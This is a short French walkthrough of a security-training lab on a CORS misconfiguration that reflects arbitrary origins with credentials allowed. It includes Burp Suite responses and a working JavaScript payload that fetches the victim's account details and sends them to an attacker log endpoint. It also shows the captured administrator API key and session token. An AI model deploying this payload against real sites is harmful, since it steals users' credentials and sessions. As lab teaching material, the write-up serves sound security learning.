# __Lab: CORS vulnerability with basic origin reflection__

On commence par se co avec les id (wiener :peter)

On catch le retour sur burpsuite :

HTTP/2 200 OK

Access-Control-Allow-Credentials: true

Content-Type: application/json; charset=utf-8

X-Frame-Options: SAMEORIGIN

Content-Length: 149

{

  "username": "wiener",

  "email": "",

  "apikey": "9IsuHQvbdmr4rdIZN69CbmplJa0Ko6KT",

  "sessions": [

    "dEEcCW8vUMlyY7uCWBTOiCtZrRE7Olea"

  ]

}

On regarde si en mettant : Origin : [https://exemple.com](https://exemple.com) On a bien un retour :

HTTP/2 200 OK

Access-Control-Allow-Origin: https://example.com

Access-Control-Allow-Credentials: true

Content-Type: application/json; charset=utf-8

X-Frame-Options: SAMEORIGIN

Content-Length: 149

{

  "username": "wiener",

  "email": "",

  "apikey": "9IsuHQvbdmr4rdIZN69CbmplJa0Ko6KT",

  "sessions": [

    "dEEcCW8vUMlyY7uCWBTOiCtZrRE7Olea"

  ]

}

Et enfin on met ce script dans l’exploit serveur et on rajoute ca dans le body :

<script>

    var req = new XMLHttpRequest();

    req.onload = reqListener;

    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);

    req.withCredentials = true;

    req.send();

    function reqListener() {

        location='/log?key='+this.responseText;

    };

</script>

On sauvegarde et on envoi à l’admin :

On regarde la console et on voit cette ligne 

10.0.3.85       2026-02-16 23:55:16 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22FID30oXAXJyiEf7WQL3rtBShNya0iH2v%22,%20%20%22sessions%22:%20[%20%20%20%20%226499pikU1BLx8gBpDU0OjvYJe4knTQ7Q%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

Avec donc ça: %22apikey%22:%20%22FID30oXAXJyiEf7WQL3rtBShNya0iH2v%22,%20%20%22sessions%22:%20[%20%20%20%20%226499pikU1BLx8gBpDU0OjvYJe4knTQ7Q%22%20%20]

On passe en URL-DECODE :

"apikey": "FID30oXAXJyiEf7WQL3rtBShNya0iH2v",  "sessions": [    "6499pikU1BLx8gBpDU0OjvYJe4knTQ7Q"  ]

Et le flag est juste l’apikey
